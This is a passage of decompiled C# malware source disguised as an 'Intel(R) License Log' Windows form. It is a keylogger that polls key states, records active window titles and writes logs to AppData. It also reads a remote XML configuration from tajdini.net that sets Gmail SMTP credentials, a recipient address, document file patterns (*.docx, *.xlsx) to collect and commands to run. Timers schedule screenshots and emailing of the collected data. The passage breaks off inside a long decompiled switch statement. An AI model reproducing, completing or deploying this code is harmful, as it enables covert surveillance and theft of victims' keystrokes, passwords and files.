using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using intel_R__License_Log.My;

namespace intel_R__License_Log;

[DesignerGenerated]
public class Intel_R__License_Log : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("tmr_scr")]
	private Timer _tmr_scr;

	[AccessedThroughProperty("tmr_key")]
	private Timer _tmr_key;

	[AccessedThroughProperty("tmr_sendmail")]
	private Timer _tmr_sendmail;

	[AccessedThroughProperty("tmr_winCaption")]
	private Timer _tmr_winCaption;

	[AccessedThroughProperty("tmr_Save")]
	private Timer _tmr_Save;

	[AccessedThroughProperty("tmr_xml")]
	private Timer _tmr_xml;

	[AccessedThroughProperty("newv")]
	private Timer _newv;

	public object path7;

	public object pathXP;

	public string path1;

	public string pathErr;

	public string pathcp;

	public string pathscr;

	public string recemail;

	public string filequery;

	public string findlocation;

	public string singlefile;

	public string addr;

	public string email;

	public string pass;

	public string prtno;

	public string host;

	public string newname;

	public string filelst;

	public string filelst2;

	public string xmltxt;

	public object issend;

	public object issave;

	public object isfindsend;

	public object isfilessend;

	public object islstsnd;

	public object cp;

	public object lastprtit;

	private string wwie;

	private string nxtup;

	private string tmrsndmail;

	private string tmrscr;

	private string tmrnxtup;

	private string cmd;

	private string cmdfile;

	private string cmdfilename;

	private MailMessage mail;

	private MailMessage mailfile;

	private MailMessage mailfile2;

	private SmtpClient SmtpServer;

	private int isxml;

	private object addKey;

	private object keyPressed;

	private int charCount;

	private int lineLimit;

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	public virtual Timer tmr_scr
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_scr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_tmr_scr != null)
			{
				_tmr_scr.remove_Tick(eventHandler);
			}
			_tmr_scr = value;
			if (_tmr_scr != null)
			{
				_tmr_scr.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tmr_key
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_key;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = tmr_update_Tick;
			if (_tmr_key != null)
			{
				_tmr_key.remove_Tick(eventHandler);
			}
			_tmr_key = value;
			if (_tmr_key != null)
			{
				_tmr_key.add_Tick(eventHandler);
			}
		}
	}

	public virtual Timer tmr_sendmail
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_sendmail;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = sendmail_Tick;
			if (_tmr_sendmail != null)
			{
				_tmr_sendmail.remove_Tick(eventHandler);
			}
			_tmr_sendmail = value;
			if (_tmr_sendmail != null)
			{
				_tmr_sendmail.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tmr_winCaption
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_winCaption;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = winCaption_Tick;
			if (_tmr_winCaption != null)
			{
				_tmr_winCaption.remove_Tick(eventHandler);
			}
			_tmr_winCaption = value;
			if (_tmr_winCaption != null)
			{
				_tmr_winCaption.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tmr_Save
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_Save;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = tmr_Save_Tick;
			if (_tmr_Save != null)
			{
				_tmr_Save.remove_Tick(eventHandler);
			}
			_tmr_Save = value;
			if (_tmr_Save != null)
			{
				_tmr_Save.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer tmr_xml
	{
		[DebuggerNonUserCode]
		get
		{
			return _tmr_xml;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = tmr_xml_Tick;
			if (_tmr_xml != null)
			{
				_tmr_xml.remove_Tick(eventHandler);
			}
			_tmr_xml = value;
			if (_tmr_xml != null)
			{
				_tmr_xml.add_Tick(eventHandler);
			}
		}
	}

	public virtual Timer newv
	{
		[DebuggerNonUserCode]
		get
		{
			return _newv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = newv_Tick;
			if (_newv != null)
			{
				_newv.remove_Tick(eventHandler);
			}
			_newv = value;
			if (_newv != null)
			{
				_newv.add_Tick(eventHandler);
			}
		}
	}

	public Intel_R__License_Log()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		path7 = Environment.GetEnvironmentVariable("UserProfile") + "\\AppData\\Local\\";
		pathXP = Environment.GetEnvironmentVariable("UserProfile") + "\\Application Data\\";
		mail = new MailMessage();
		mailfile = new MailMessage();
		mailfile2 = new MailMessage();
		SmtpServer = new SmtpClient();
		lineLimit = 69;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		TextBox1 = new TextBox();
		tmr_scr = new Timer(components);
		tmr_key = new Timer(components);
		tmr_sendmail = new Timer(components);
		tmr_winCaption = new Timer(components);
		tmr_Save = new Timer(components);
		tmr_xml = new Timer(components);
		newv = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(2, 48);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(264, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(12);
		TextBox textBox = TextBox1;
		location = new Point(2, 13);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(407, 29);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(11);
		tmr_scr.set_Enabled(true);
		tmr_scr.set_Interval(180000);
		tmr_key.set_Enabled(true);
		tmr_key.set_Interval(10);
		tmr_sendmail.set_Enabled(true);
		tmr_sendmail.set_Interval(120000);
		tmr_winCaption.set_Enabled(true);
		tmr_winCaption.set_Interval(1000);
		tmr_Save.set_Enabled(true);
		tmr_Save.set_Interval(23000);
		tmr_xml.set_Enabled(true);
		tmr_xml.set_Interval(180000);
		newv.set_Enabled(true);
		newv.set_Interval(300000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(420, 153);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Intel_R__License_Log");
		((Form)this).set_Text("Intel(R) License Log");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int nVirtKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetActiveWindow();

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(long hwnd);

	public string GetCaption()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		IntPtr activeWindow = GetActiveWindow();
		GetWindowText(activeWindow, stringBuilder, stringBuilder.Capacity);
		return stringBuilder.ToString();
	}

	public bool getCapslock()
	{
		return (GetKeyState(20) & 1) != 0;
	}

	public bool getShift()
	{
		return GetAsyncKeyState(16) != 0;
	}

	public object md5check(string filepath)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
		fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
		mD5CryptoServiceProvider.ComputeHash(fileStream);
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", ""));
		object[] array = new object[1] { filepath };
		bool[] array2 = new bool[1] { true };
		object obj = NewLateBinding.LateGet(objectValue, (Type)null, "GetFile", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			filepath = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		}
		RuntimeHelpers.GetObjectValue(obj);
		byte[] hash = mD5CryptoServiceProvider.Hash;
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array3 = hash;
		foreach (byte b in array3)
		{
			stringBuilder.Append($"{b:X1}");
		}
		return stringBuilder.ToString();
	}

	public object GetMD5(string filePath)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
		fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
		mD5CryptoServiceProvider.ComputeHash(fileStream);
		fileStream.Close();
		byte[] hash = mD5CryptoServiceProvider.Hash;
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = hash;
		foreach (byte b in array)
		{
			stringBuilder.Append($"{b:X2}");
		}
		return stringBuilder.ToString();
	}

	private bool InternetConnection()
	{
		WebRequest webRequest = WebRequest.Create("http://www.google.com/");
		try
		{
			webRequest.GetResponse();
			webRequest = null;
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			webRequest = null;
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private object readwebtext(string address)
	{
		WebClient webClient = new WebClient();
		string text = "";
		webClient.Encoding = Encoding.UTF8;
		return webClient.DownloadString(address);
	}

	public string GetOSVersion()
	{
		switch (Environment.OSVersion.Platform)
		{
		case PlatformID.Win32S:
			return "Win 3.1";
		case PlatformID.Win32Windows:
			return Environment.OSVersion.Version.Minor switch
			{
				0 => "Win95", 
				10 => "Win98", 
				90 => "WinME", 
				_ => "Unknown", 
			};
		case PlatformID.Win32NT:
			switch (Environment.OSVersion.Version.Major)
			{
			default:
				return "Unknown";
			case 3:
				return "NT 3.51";
			case 4:
				return "NT 4.0";
			case 5:
				switch (Environment.OSVersion.Version.Minor)
				{
				case 0:
					return "Win2000";
				case 1:
					return "WinXP";
				case 2:
					return "Win2003";
				}
				break;
			case 6:
				switch (Environment.OSVersion.Version.Minor)
				{
				case 0:
					return "Vista/Win2008Server";
				case 1:
					return "Win7/Win2008Server R2";
				case 2:
					return "Win8/Win2012Server";
				}
				break;
			}
			goto default;
		default:
			return Conversions.ToString(0);
		case PlatformID.WinCE:
			return "Win CE";
		}
	}

	public void saveFile()
	{
		if (Environment.OSVersion.Version.Major >= 6)
		{
			path1 = Conversions.ToString(Operators.AddObject(path7, (object)"DebugLog.txt"));
		}
		else
		{
			path1 = Conversions.ToString(Operators.AddObject(pathXP, (object)"DebugLog.txt"));
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(path1, TextBox1.get_Text(), true);
			((TextBoxBase)TextBox1).Clear();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(path1, "###------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(path1, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
	}

	public void xmlgen()
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml", "", false);
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml", "<", false);
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml", "?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n", false);
		xmltxt += "<Config>\r\n";
		xmltxt += "<wwie></wwie>\r\n";
		xmltxt = xmltxt + "<nxtup>http://tajdini.net/confz/configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml</nxtup>\r\n";
		xmltxt += "<tmrsndmail>120000</tmrsndmail>\r\n";
		xmltxt += "<tmrscr>150000</tmrscr>\r\n";
		xmltxt += "<recemail></recemail>\r\n";
		xmltxt += "<filequery>*.docx;*.xlsx</filequery>\r\n";
		xmltxt += "<findlocation>all</findlocation>\r\n";
		xmltxt += "<singlefile></singlefile>\r\n";
		xmltxt += "<tmrnxtup>180000</tmrnxtup>\r\n";
		xmltxt += "<cmd></cmd>\r\n";
		xmltxt += "<cmdfile></cmdfile>\r\n";
		xmltxt += "<cmdfilename></cmdfilename>\r\n";
		xmltxt += "<email></email>\r\n";
		xmltxt += "<pass></pass>\r\n";
		xmltxt += "<prtno>587</prtno>\r\n";
		xmltxt += "<host>smtp.gmail.com</host>\r\n";
		xmltxt += "</Config>\r\n";
		((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml", xmltxt, false);
	}

	public void readconfig()
	{
		try
		{
			if (File.Exists(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml"))
			{
				isxml = 1;
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml");
				XmlNodeList xmlNodeList = xmlDocument.SelectNodes("Config");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = xmlNodeList.GetEnumerator();
					while (enumerator.MoveNext())
					{
						XmlNode xmlNode = (XmlNode)enumerator.Current;
						wwie = xmlNode["wwie"]!.InnerText;
						nxtup = xmlNode["nxtup"]!.InnerText;
						tmrsndmail = xmlNode["tmrsndmail"]!.InnerText;
						tmrscr = xmlNode["tmrscr"]!.InnerText;
						recemail = xmlNode["recemail"]!.InnerText;
						filequery = xmlNode["filequery"]!.InnerText;
						findlocation = xmlNode["findlocation"]!.InnerText;
						singlefile = xmlNode["singlefile"]!.InnerText;
						tmrnxtup = xmlNode["tmrnxtup"]!.InnerText;
						cmd = xmlNode["cmd"]!.InnerText;
						cmdfile = xmlNode["cmdfile"]!.InnerText;
						cmdfilename = xmlNode["cmdfilename"]!.InnerText;
						email = xmlNode["email"]!.InnerText;
						pass = xmlNode["pass"]!.InnerText;
						prtno = xmlNode["prtno"]!.InnerText;
						host = xmlNode["host"]!.InnerText;
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			else
			{
				isxml = 0;
			}
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, tmrscr.ToString() + "\r\n", true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tmr_update_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num8 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num6;
					int num9;
					int num7;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 6778:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_001e;
							case 4:
								goto IL_0039;
							case 5:
								goto IL_0043;
							case 7:
							case 8:
								goto IL_0056;
							case 9:
								goto IL_006a;
							case 10:
								goto IL_0086;
							case 11:
								goto IL_0095;
							case 13:
							case 14:
								goto IL_00ac;
							case 15:
								goto IL_00c2;
							case 16:
								goto IL_00de;
							case 19:
							case 20:
								goto IL_00f2;
							case 21:
								goto IL_010b;
							case 22:
								goto IL_0127;
							case 23:
								goto IL_0136;
							case 25:
								goto IL_014a;
							case 26:
								goto IL_014e;
							case 30:
							case 31:
								goto IL_0162;
							case 32:
								goto IL_017b;
							case 33:
								goto IL_0197;
							case 34:
								goto IL_01a6;
							case 36:
								goto IL_01ba;
							case 37:
								goto IL_01be;
							case 41:
							case 42:
								goto IL_01d2;
							case 43:
								goto IL_01eb;
							case 44:
								goto IL_0207;
							case 45:
								goto IL_0216;
							case 47:
								goto IL_022a;
							case 48:
								goto IL_022e;
							case 52:
							case 53:
								goto IL_0242;
							case 54:
								goto IL_025b;
							case 55:
								goto IL_0277;
							case 56:
								goto IL_0286;
							case 58:
								goto IL_029a;
							case 59:
								goto IL_029e;
							case 63:
							case 64:
								goto IL_02b2;
							case 65:
								goto IL_02cb;
							case 66:
								goto IL_02e7;
							case 67:
								goto IL_02f6;
							case 69:
								goto IL_030a;
							case 70:
								goto IL_030e;
							case 74:
							case 75:
								goto IL_0322;
							case 76:
								goto IL_033b;
							case 77:
								goto IL_0357;
							case 78:
								goto IL_0366;
							case 80:
								goto IL_037a;
							case 81:
								goto IL_037e;
							case 85:
							case 86:
								goto IL_0392;
							case 87:
								goto IL_03ab;
							case 88:
								goto IL_03c7;
							case 89:
								goto IL_03d6;
							case 91:
								goto IL_03ea;
							case 92:
								goto IL_03ee;
							case 96:
							case 97:
								goto IL_0402;
							case 98:
								goto IL_0418;
							case 99:
								goto IL_0434;
							case 100:
								goto IL_0443;
							case 102:
								goto IL_0457;
							case 103:
								goto IL_045b;
							case 107:
							case 108:
								goto IL_046f;
							case 109:
								goto IL_0485;
							case 110:
								goto IL_04a1;
							case 111:
								goto IL_04b0;
							case 113:
								goto IL_04c4;
							case 114:
								goto IL_04c8;
							case 118:
							case 119:
								goto IL_04dc;
							case 120:
								goto IL_04f2;
							case 121:
								goto IL_050e;
							case 122:
								goto IL_051d;
							case 124:
								goto IL_0531;
							case 125:
								goto IL_0535;
							case 129:
							case 130:
								goto IL_0549;
							case 131:
								goto IL_0562;
							case 132:
								goto IL_0581;
							case 133:
								goto IL_0593;
							case 135:
								goto IL_05aa;
							case 136:
								goto IL_05b1;
							case 140:
							case 141:
								goto IL_05c8;
							case 142:
								goto IL_05e1;
							case 143:
								goto IL_0600;
							case 144:
								goto IL_0612;
							case 146:
								goto IL_0629;
							case 147:
								goto IL_0630;
							case 151:
							case 152:
								goto IL_0647;
							case 153:
								goto IL_0660;
							case 154:
								goto IL_067f;
							case 155:
								goto IL_0691;
							case 157:
								goto IL_06a8;
							case 158:
								goto IL_06af;
							case 162:
							case 163:
								goto IL_06c6;
							case 164:
								goto IL_06df;
							case 165:
								goto IL_06fe;
							case 166:
								goto IL_0710;
							case 168:
								goto IL_0727;
							case 169:
								goto IL_072e;
							case 173:
							case 174:
								goto IL_0745;
							case 175:
								goto IL_075e;
							case 176:
								goto IL_077d;
							case 177:
								goto IL_078f;
							case 179:
								goto IL_07a6;
							case 180:
								goto IL_07ad;
							case 184:
							case 185:
								goto IL_07c4;
							case 186:
								goto IL_07dd;
							case 187:
								goto IL_07fc;
							case 188:
								goto IL_080e;
							case 190:
								goto IL_0825;
							case 191:
								goto IL_082c;
							case 195:
							case 196:
								goto IL_0843;
							case 197:
								goto IL_085c;
							case 198:
								goto IL_087b;
							case 199:
								goto IL_088d;
							case 201:
								goto IL_08a4;
							case 202:
								goto IL_08ab;
							case 206:
							case 207:
								goto IL_08c2;
							case 208:
								goto IL_08db;
							case 209:
								goto IL_08fa;
							case 210:
								goto IL_090c;
							case 211:
								goto IL_091e;
							case 213:
								goto IL_0938;
							case 214:
								goto IL_093f;
							case 217:
							case 218:
								goto IL_0956;
							case 219:
								goto IL_096f;
							case 220:
								goto IL_098e;
							case 221:
								goto IL_09a0;
							case 223:
								goto IL_09b7;
							case 224:
								goto IL_09be;
							case 228:
							case 229:
								goto IL_09d5;
							case 230:
								goto IL_09ee;
							case 231:
								goto IL_0a0d;
							case 233:
							case 234:
								goto IL_0a24;
							case 235:
								goto IL_0a3d;
							case 236:
								goto IL_0a5c;
							case 237:
								goto IL_0a6e;
							case 239:
								goto IL_0a85;
							case 240:
								goto IL_0a8c;
							case 244:
							case 245:
								goto IL_0aa3;
							case 246:
								goto IL_0abc;
							case 247:
								goto IL_0adb;
							case 248:
								goto IL_0aed;
							case 250:
								goto IL_0b04;
							case 251:
								goto IL_0b0b;
							case 255:
							case 256:
								goto IL_0b22;
							case 257:
								goto IL_0b3b;
							case 258:
								goto IL_0b5a;
							case 261:
							case 262:
								goto IL_0b71;
							case 263:
								goto IL_0b89;
							case 264:
								goto IL_0ba8;
							case 265:
								goto IL_0bba;
							case 267:
								goto IL_0bd1;
							case 268:
								goto IL_0bd8;
							case 272:
							case 273:
								goto IL_0bef;
							case 274:
								goto IL_0c0b;
							case 275:
								goto IL_0c2a;
							case 276:
								goto IL_0c3c;
							case 278:
								goto IL_0c53;
							case 279:
								goto IL_0c5a;
							case 283:
							case 284:
								goto IL_0c71;
							case 285:
								goto IL_0c8d;
							case 286:
								goto IL_0cac;
							case 287:
								goto IL_0cbe;
							case 289:
								goto IL_0cd5;
							case 290:
								goto IL_0cdc;
							case 294:
							case 295:
								goto IL_0cf5;
							case 296:
								goto IL_0d11;
							case 297:
								goto IL_0d30;
							case 298:
								goto IL_0d42;
							case 300:
								goto IL_0d59;
							case 301:
								goto IL_0d60;
							case 305:
							case 306:
								goto IL_0d77;
							case 307:
								goto IL_0d93;
							case 308:
								goto IL_0db2;
							case 309:
								goto IL_0dc4;
							case 311:
								goto IL_0ddb;
							case 312:
								goto IL_0de2;
							case 316:
							case 317:
								goto IL_0df9;
							case 318:
								goto IL_0e03;
							case 319:
								goto IL_0e1b;
							case 338:
							case 339:
								goto IL_0e3a;
							case 320:
								goto IL_0e59;
							case 321:
								goto IL_0e6b;
							case 322:
								goto IL_0e7a;
							case 324:
								goto IL_0e9c;
							case 325:
								goto IL_0ea3;
							case 328:
								goto IL_0ec5;
							case 329:
								goto IL_0ecc;
							case 330:
								goto IL_0ede;
							case 332:
								goto IL_0f00;
							case 333:
								goto IL_0f07;
							case 340:
								goto IL_0f29;
							case 341:
								goto IL_0f33;
							case 342:
								goto IL_0f4b;
							case 383:
							case 384:
								goto IL_0f6a;
							case 343:
								goto IL_0f83;
							case 344:
								goto IL_0f95;
							case 374:
							case 375:
								goto IL_0fdd;
							case 346:
							case 348:
								goto IL_0ff4;
							case 350:
							case 351:
								goto IL_100b;
							case 353:
							case 354:
								goto IL_1022;
							case 356:
							case 357:
								goto IL_1039;
							case 359:
							case 360:
								goto IL_1050;
							case 362:
							case 363:
								goto IL_1064;
							case 365:
							case 366:
								goto IL_1078;
							case 368:
							case 369:
								goto IL_108c;
							case 371:
							case 372:
								goto IL_10a0;
							case 378:
								goto IL_10b4;
							case 379:
								goto IL_10bb;
							case 6:
							case 12:
							case 17:
							case 24:
							case 27:
							case 28:
							case 35:
							case 38:
							case 39:
							case 46:
							case 49:
							case 50:
							case 57:
							case 60:
							case 61:
							case 68:
							case 71:
							case 72:
							case 79:
							case 82:
							case 83:
							case 90:
							case 93:
							case 94:
							case 101:
							case 104:
							case 105:
							case 112:
							case 115:
							case 116:
							case 123:
							case 126:
							case 127:
							case 134:
							case 137:
							case 138:
							case 145:
							case 148:
							case 149:
							case 156:
							case 159:
							case 160:
							case 167:
							case 170:
							case 171:
							case 178:
							case 181:
							case 182:
							case 189:
							case 192:
							case 193:
							case 200:
							case 203:
							case 204:
							case 212:
							case 215:
							case 216:
							case 222:
							case 225:
							case 226:
							case 232:
							case 238:
							case 241:
							case 242:
							case 249:
							case 252:
							case 253:
							case 259:
							case 266:
							case 269:
							case 270:
							case 277:
							case 280:
							case 281:
							case 288:
							case 291:
							case 292:
							case 299:
							case 302:
							case 303:
							case 310:
							case 313:
							case 314:
							case 323:
							case 326:
							case 327:
							case 331:
							case 334:
							case 335:
							case 336:
							case 345:
							case 349:
							case 352:
							case 355:
							case 358:
							case 361:
							case 364:
							case 367:
							case 370:
							case 373:
							case 376:
							case 377:
							case 380:
							case 381:
							case 387:
								goto IL_10d3;
							case 388:
								goto IL_10ea;
							case 389:
								goto IL_10f8;
							case 390:
							case 391:
								goto IL_110f;
							case 392:
								goto IL_1129;
							case 393:
							case 394:
								goto IL_1146;
							case 385:
								goto end_IL_0001_2;
							case 18:
								num = 18;
								charCount++;
								goto IL_00f2;
							case 29:
								num = 29;
								charCount++;
								goto IL_0162;
							case 40:
								num = 40;
								charCount++;
								goto IL_01d2;
							case 51:
								num = 51;
								charCount++;
								goto IL_0242;
							case 62:
								num = 62;
								charCount++;
								goto IL_02b2;
							case 73:
								num = 73;
								charCount++;
								goto IL_0322;
							case 84:
								num = 84;
								charCount++;
								goto IL_0392;
							case 95:
								num = 95;
								charCount++;
								goto IL_0402;
							case 106:
								num = 106;
								charCount++;
								goto IL_046f;
							case 117:
								num = 117;
								charCount++;
								goto IL_04dc;
							case 128:
								num = 128;
								charCount++;
								goto IL_0549;
							case 139:
								num = 139;
								charCount++;
								goto IL_05c8;
							case 150:
								num = 150;
								charCount++;
								goto IL_0647;
							case 161:
								num = 161;
								charCount++;
								goto IL_06c6;
							case 172:
								num = 172;
								charCount++;
								goto IL_0745;
							case 183:
								num = 183;
								charCount++;
								goto IL_07c4;
							case 194:
								num = 194;
								charCount++;
								goto IL_0843;
							case 205:
								num = 205;
								charCount++;
								goto IL_08c2;
							case 227:
								num = 227;
								charCount++;
